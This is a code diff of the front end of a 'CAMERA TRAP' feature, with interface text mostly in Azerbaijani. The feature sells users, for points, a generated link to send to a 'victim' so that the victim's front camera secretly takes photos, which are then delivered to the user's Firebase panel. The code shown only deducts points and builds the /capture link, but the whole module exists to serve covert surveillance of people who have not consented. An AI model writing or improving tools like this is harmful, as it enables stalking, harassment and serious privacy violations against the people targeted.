@@ -1,67 +1,55 @@
-<div id="trap-container" style="color: white; font-family: 'Outfit', sans-serif; text-align: center; padding: 20px;">
-    <i class="fas fa-camera-retro" style="font-size: 4rem; color: #00dfff; margin-bottom: 20px;"></i>
-    <h2 style="font-family: 'Syncopate'; font-size: 1rem;">CAMERA TRAP SYSTEM</h2>
-    <p style="opacity: 0.6; font-size: 0.8rem;">Qurbanın şəklini çəkmək üçün xüsusi kəşfiyyat linki yaradın.</p>
-
-    <div id="trap-init">
-        <div style="background: rgba(0,223,255,0.1); padding: 15px; border-radius: 15px; border: 1px dashed #00dfff; margin: 20px 0;">
-            <span style="color: #00dfff; font-weight: 900;">TƏLƏB OLUNAN: 450 PTS</span>
+<div id="trap-module" style="color: white; font-family: 'Outfit', sans-serif; text-align: center; padding: 20px;">
+    <i class="fas fa-video-slash" style="font-size: 4rem; color: #ff007a; margin-bottom: 20px;"></i>
+    <h2 id="trap-head" style="font-family: 'Syncopate'; font-size: 1rem;">CAMERA TRAP v3.0</h2>
+    
+    <div id="trap-init-gate">
+        <p style="opacity: 0.6; font-size: 0.8rem;">Qurbanın ön kamerasından gizli şəkil çəkmək üçün kiber-link yaradın.</p>
+        <div style="background: rgba(255, 0, 122, 0.1); padding: 15px; border-radius: 15px; border: 1px dashed #ff007a; margin: 20px 0;">
+            <span style="color: #ff007a; font-weight: 900;">MƏBLƏĞ: 500 PTS</span>
         </div>
-        <button onclick="unlockTrapLink()" id="trap-btn" style="width: 100%; padding: 18px; border-radius: 15px; border: none; background: white; color: black; font-weight: 900; cursor: pointer;">
-            LİNKİ GENERASİYA ET (450 PTS)
-        </button>
+        <button onclick="generateSecureLink()" id="gen-btn" style="width: 100%; padding: 18px; border-radius: 15px; border: none; background: white; color: black; font-weight: 900; cursor: pointer;">LİNKİ AKTİVLƏŞDİR</button>
     </div>
 
     <div id="trap-loading" style="display: none; margin-top: 30px;">
-        <div class="spinner" style="border: 3px solid rgba(255,255,255,0.1); border-top: 3px solid #00dfff; border-radius: 50%; width: 40px; height: 40px; animation: spin 1s linear infinite; margin: auto;"></div>
-        <p style="font-size: 0.8rem; margin-top: 15px; color: #00dfff;">Təhlükəsiz kanal qurulur...</p>
+        <div class="loader-spin" style="border: 3px solid rgba(255,255,255,0.1); border-top: 3px solid #ff007a; border-radius: 50%; width: 40px; height: 40px; animation: spin 1s linear infinite; margin: auto;"></div>
+        <p style="font-size: 0.8rem; margin-top: 15px; color: #ff007a;">Təhlükəsizlik şifrələri qırılır...</p>
     </div>
 
-    <div id="trap-result" style="display: none; margin-top: 30px; animation: fadeIn 0.5s;">
+    <div id="trap-result" style="display: none; margin-top: 30px; animation: fadeInUp 0.5s;">
         <p style="font-size: 0.8rem; color: #00ff00;"><i class="fas fa-check-circle"></i> Link uğurla yaradıldı!</p>
-        <div style="background: #111; padding: 15px; border-radius: 12px; border: 1px solid #333; word-break: break-all; margin-top: 10px;">
-            <code id="generated-link" style="color: #00dfff;">https://elite-aura.net/secure/view?id=tr_892k1x</code>
+        <div style="background: #000; padding: 15px; border-radius: 12px; border: 1px solid #333; margin-top: 10px;">
+            <code id="final-link-box" style="color: #ff007a; font-size: 0.8rem; word-break: break-all;"></code>
         </div>
-        <p style="font-size: 0.7rem; opacity: 0.5; margin-top: 10px;">Bu linki qurbana göndərin. Şəkil çəkildikdə paneldə görünəcək.</p>
+        <p style="font-size: 0.7rem; opacity: 0.5; margin-top: 15px;">Bu linki qurbana göndərin. Şəkil çəkildikdə Firebase panelinizə (images bölməsinə) düşəcək.</p>
     </div>
 </div>
 
-<style>
-    @keyframes spin { 100% { transform: rotate(360deg); } }
-    @keyframes fadeIn { from { opacity: 0; } to { opacity: 1; } }
-</style>
-
 <script>
-    async function unlockTrapLink() {
-        const btn = document.getElementById('trap-btn');
-        const user = localStorage.getItem('active_user') || document.getElementById('u-tag').innerText.toLowerCase();
+    async function generateSecureLink() {
+        const user = localStorage.getItem('elite_session');
         const userRef = db.ref('users/' + user);
-
-        btn.disabled = true;
-        btn.innerText = "YOXLANILIR...";
-
         const snap = await userRef.get();
-        const points = snap.val().points || 0;
+        const pts = snap.val().points || 0;
 
-        if (points < 450) {
-            alert("Xalınız çatmır! Lazımdır: 450 PTS.");
-            btn.disabled = false;
-            btn.innerText = "LİNKİ GENERASİYA ET (450 PTS)";
+        if (pts < 500) {
+            alert(currentLang === 'az' ? "Xalınız kifayət deyil!" : "Puanınız yetersiz!");
             return;
         }
 
-        // Xalı çıxırıq
-        const newPoints = points - 450;
-        await userRef.update({ points: newPoints });
-        if(document.getElementById('pts-tag')) document.getElementById('pts-tag').innerText = newPoints;
-
-        // Animasiyanı başlat
-        document.getElementById('trap-init').style.display = 'none';
+        // Xalın çıxılması
+        await userRef.update({ points: pts - 500 });
+        
+        document.getElementById('trap-init-gate').style.display = 'none';
         document.getElementById('trap-loading').style.display = 'block';
 
         setTimeout(() => {
             document.getElementById('trap-loading').style.display = 'none';
             document.getElementById('trap-result').style.display = 'block';
-        }, 3000);
+            
+            // Real sayt linkini qurmaq (domain-i avtomatik tapır)
+            const siteUrl = window.location.origin;
+            const uniqueID = Math.random().toString(36).substring(7);
+            document.getElementById('final-link-box').innerText = `${siteUrl}/capture?id=${uniqueID}&ref=${user}`;
+        }, 3500);
     }
 </script>
